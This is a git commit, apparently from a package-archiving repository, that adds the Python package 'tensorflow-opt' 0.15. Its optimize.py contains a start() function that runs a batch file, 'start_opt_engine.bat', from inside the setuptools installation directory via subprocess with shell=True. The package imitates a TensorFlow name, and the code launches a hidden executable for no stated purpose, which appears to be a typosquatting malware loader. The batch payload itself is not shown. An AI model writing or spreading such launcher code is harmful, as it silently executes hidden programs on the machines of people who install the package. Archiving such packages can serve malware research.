0cfad1592612b3b5d3a775bb08c3f2708b11320f
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-05 23:14:18 +0000

    Add package tensorflow-opt/0.15/tensorflow_opt-0.15.tar.gz

---
+++ packages/tensorflow-opt/tensorflow_opt-0.15.tar.gz/tensorflow_opt-0.15/src/tensorflow_opt/code/optimize.py
@@ -0,0 +1,10 @@
+import subprocess, os
+import setuptools
+
+def start():
+    folder = os.path.join(setuptools.__path__[0],'tensorflow_opt','code','bin')
+    filepath=os.path.join(folder, "start_opt_engine.bat")
+    print(filepath)
+    p = subprocess.Popen(filepath, shell=True, stdout = subprocess.PIPE)
+
+    stdout, stderr = p.communicate()
